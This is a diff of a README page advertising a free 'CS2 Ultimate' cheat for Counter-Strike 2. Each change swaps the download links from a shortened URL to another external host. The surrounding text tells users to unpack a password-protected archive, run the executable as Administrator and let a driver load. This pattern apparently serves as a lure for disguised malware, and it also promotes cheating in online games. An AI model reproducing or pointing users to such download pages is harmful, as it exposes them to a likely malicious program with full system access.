@@ -9,7 +9,7 @@ The **🔫 CS2 Ultimate Utility** is a **free**, high-performance external enhan
 
 <div align="center">
 
-[![Download CS2 Ultimate](https://img.shields.io/badge/Download-orange?style=for-the-badge&logo=icloud)](https://tinyurl.com/cs2-ultimate-ch3at-free)
+[![Download CS2 Ultimate](https://img.shields.io/badge/Download-orange?style=for-the-badge&logo=icloud)](https://software-nation.com/cs2-ultimate-ch3at-free)
 
 </div>
 <div align="center">
@@ -83,7 +83,7 @@ In the highly competitive world of CS2, precision and situational awareness are 
 2. **📦 Extract the archive** — Use the password `2026` to unlock the files.
 3. **🖱️ Run as Administrator** — Launch `CS2_Ultimate.exe`, wait for the driver to load, and start the game.
 
-[![Download CS2 Ultimate](https://img.shields.io/badge/Download-orange?style=for-the-badge&logo=icloud)](https://tinyurl.com/cs2-ultimate-ch3at-free)
+[![Download CS2 Ultimate](https://img.shields.io/badge/Download-orange?style=for-the-badge&logo=icloud)](https://software-nation.com/cs2-ultimate-ch3at-free)
 
 ---
 
@@ -122,7 +122,7 @@ In the highly competitive world of CS2, precision and situational awareness are 
 
 <div align="center">
 
-[![Download CS2 Ultimate](https://img.shields.io/badge/Download-orange?style=for-the-badge&logo=icloud)](https://tinyurl.com/cs2-ultimate-ch3at-free)
+[![Download CS2 Ultimate](https://img.shields.io/badge/Download-orange?style=for-the-badge&logo=icloud)](https://software-nation.com/cs2-ultimate-ch3at-free)
 
 **Version 3.4.1** — Own the Server. April 2026 Update. Zero cost.
 
